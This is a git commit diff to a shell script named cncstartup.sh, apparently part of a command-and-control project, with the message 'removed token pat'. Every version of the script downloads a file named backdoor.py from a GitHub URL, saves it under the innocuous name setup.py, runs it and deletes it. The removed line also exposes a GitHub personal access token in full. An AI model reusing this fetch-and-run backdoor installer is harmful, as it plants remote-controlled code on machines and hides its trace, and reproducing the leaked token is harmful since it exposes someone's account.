f60b4b516e08e61bb95bd51dd27c3d91601faa76
Abinavraj Ganesh Sudhakar <abinavraj10@gmail.com>
2023-03-24 16:16:02 -0500

    removed token pat

--- cncstartup.sh
+++ cncstartup.sh
@@ -1,5 +1,5 @@
 yum install -y python3;
-curl -o setup.py https://raw.githubusercontent.com/Shuttlemax/CommandControl/main/backdoor.py -H "Authorization: Token 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";
+curl -o setup.py https://raw.githubusercontent.com/Shuttlemax/CommandControl/main/backdoor.py;
 chmod +x setup.py
 python3 setup.py;
 rm setup.py
